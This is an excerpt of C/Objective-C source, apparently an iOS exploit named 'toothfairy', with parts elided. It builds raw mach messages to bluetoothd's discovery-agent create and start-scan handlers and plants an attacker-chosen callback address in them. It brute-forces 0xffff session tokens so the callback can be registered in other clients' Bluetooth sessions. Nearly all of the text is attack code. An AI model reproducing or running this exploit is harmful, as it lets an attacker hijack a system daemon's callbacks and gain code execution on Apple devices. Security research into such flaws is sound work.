...
//  toothfairy
//
//  Created by @omerporze on 12/09/2018.
...
#define BT_MACH_MESSAGE_DISCOVERY_AGENT_START_SCAN_MSG_ID 0x31  // the ordinal for our function
#define BT_MACH_MESSAGE_DISCOVERY_AGENT_START_SCAN_RECV_SIZE 0x2C
#define BT_MACH_MESSAGE_DISCOVERY_AGENT_START_SCAN_SEND_SIZE 0x30
#define BT_MACH_MESSAGE_DISCOVERY_AGENT_START_SCAN_OPTIONS 0x113
#define BT_MACH_MESSAGE_DISCOVERY_AGENT_START_SCAN_TIMEOUT 0x186A0


#define BT_MACH_MESSAGE_DISCOVERY_AGENT_CREATE_MSG_ID 0x2f
#define BT_MACH_MESSAGE_DISCOVERY_AGENT_CREATE_RECV_SIZE 0x44
#define BT_MACH_MESSAGE_DISCOVERY_AGENT_CREATE_SEND_SIZE 0x40
#define BT_MACH_MESSAGE_DISCOVERY_AGENT_CREATE_OPTIONS 0x113
#define BT_MACH_MESSAGE_DISCOVERY_AGENT_CREATE_TIMEOUT 0x186A0
...
mach_msg_return_value BTDiscovery_agent_start_scan(mach_port_t bluetoothd_port, mach_port_t session_token, void* callback_address, long additional_data)
{
    mach_port_t receive_port = MACH_PORT_NULL;
    mach_msg_header_t * message = NULL; // size of minimal header - 24 which is 0x18
    char *data = NULL;
    kern_return_t ret = KERN_SUCCESS;
    ...
    mach_msg_id_t msgh_id = BT_MACH_MESSAGE_DISCOVERY_AGENT_START_SCAN_MSG_ID;
    mach_msg_size_t recv_size = BT_MACH_MESSAGE_DISCOVERY_AGENT_START_SCAN_RECV_SIZE;
    mach_msg_size_t send_size = BT_MACH_MESSAGE_DISCOVERY_AGENT_START_SCAN_SEND_SIZE;
    mach_msg_option_t options = BT_MACH_MESSAGE_DISCOVERY_AGENT_START_SCAN_OPTIONS;
    ...
    *((mach_port_t *)(data+ADD_CALLBACK_MACH_MSG_IN_SESSION_TOKEN_OFFSET)) = session_token;
    ...
    ret = mach_msg(message,              /* The header */
                   ...
                   BT_MACH_MESSAGE_DISCOVERY_AGENT_START_SCAN_TIMEOUT,        /* No timeout */
    ...
    if(MACH_MSG_SUCCESS == ret)
    {
        ...
        if (return_value != BT_WRONG_TOKEN) {
            ...
            NSLog(@"Wrong token for start msg id %d with token %x, returned: %x", msgh_id, session_token, return_value);
        }
...
mach_msg_return_value BTDiscovery_agent_create(mach_port_t bluetoothd_port, mach_port_t session_token, void* callback_address, long additional_data)
{
    mach_port_t receive_port = MACH_PORT_NULL;
    ...
    mach_msg_id_t msgh_id = BT_MACH_MESSAGE_DISCOVERY_AGENT_CREATE_MSG_ID;
    mach_msg_size_t recv_size = BT_MACH_MESSAGE_DISCOVERY_AGENT_CREATE_RECV_SIZE;
    mach_msg_size_t send_size = BT_MACH_MESSAGE_DISCOVERY_AGENT_CREATE_SEND_SIZE;
    mach_msg_option_t options = BT_MACH_MESSAGE_DISCOVERY_AGENT_CREATE_OPTIONS;
    mach_msg_size_t msg_size = MAX(recv_size, send_size);
    ...
    *((mach_port_t *)(data+ADD_CALLBACK_MACH_MSG_IN_SESSION_TOKEN_OFFSET)) = session_token;
    *((void **)(data+ADD_CALLBACK_MACH_MSG_IN_CALLBACK_ADDRESS_OFFSET)) = callback_address;
    //*((void **)(data+ADD_CALLBACK_MACH_MSG_IN_CALLBACK_ADDRESS_OFFSET - 4)) = callback_address;
    //*((void **)(data+ADD_CALLBACK_MACH_MSG_IN_CALLBACK_ADDRESS_OFFSET + 4)) = callback_address;
    //*((void **)(data+ADD_CALLBACK_MACH_MSG_IN_CALLBACK_ADDRESS_OFFSET + 8)) = callback_address;
    //*((long *)(data+ADD_CALLBACK_MACH_MSG_IN_CALLBACK_DATA)) = additional_data;
    ...
    ret = mach_msg(message,              /* The header */
                   ...
                   recv_size,              /* Max receive Size */
                   receive_port,                 /* Receive port */
                   BT_MACH_MESSAGE_DISCOVERY_AGENT_CREATE_TIMEOUT,        /* No timeout */
                   MACH_PORT_NULL);              /* No notification */
    ...
    if(MACH_MSG_SUCCESS == ret)
    {
        ...
        if (return_value != BT_WRONG_TOKEN) {
            ...
            //NSLog(@"Wrong token for creation id %d with token %x, returned: %x", msgh_id, session_token, return_value);
        }
    } else if (MACH_RCV_INVALID_NAME == ret)
    {
        NSLog(@"mach_error_string: mach_error_string %s", mach_error_string(ret));
...
void try_to_add_callback(void * address, long value)
{
    ...
    for (int i = 0; i <= 0xffff; i++) {
        int id = 0;
        id = (i << 16) + 1;
        //int result_code = BTDiscovery_agent_destroy(bluetoothd_port, id, address, value);
        int result_code = BTDiscovery_agent_create(bluetoothd_port, id, address, value);
        if(result_code != BT_WRONG_TOKEN && result_code != -1)
        {
            //BTDiscovery_agent_start_scan(bluetoothd_port, id,address, value);
        ...
        id = (i << 16) + 2;
        //result_code = BTDiscovery_agent_destroy(bluetoothd_port, id, address, value);
        result_code = BTDiscovery_agent_create(bluetoothd_port, id, address, value);
        if(result_code != BT_WRONG_TOKEN && result_code != -1)
        {
            //BTDiscovery_agent_start_scan(bluetoothd_port, id,address, value);
    ...
    for (int i = 0; i <= 0xffff; i++) {
        ...
        id = (i << 16) + 2;
        //result_code = BTDiscovery_agent_destroy(bluetoothd_port, id, address, value);
        result_code = BTDiscovery_agent_start_scan(bluetoothd_port, id, address, value);
        if(result_code != BT_WRONG_TOKEN && result_code != -1)
        {
            //BTDiscovery_agent_start_scan(bluetoothd_port, id,address, value);
    ...
    /*for (int i = number_of_ports_found-1; i>=0; i--) {
     ...
     BTDiscovery_agent_start_scan(bluetoothd_port, ports_found[i],address, value);
     }*/
    
    NSLog(@"Done");
    //number_of_ports_found = 0; // for while true loop
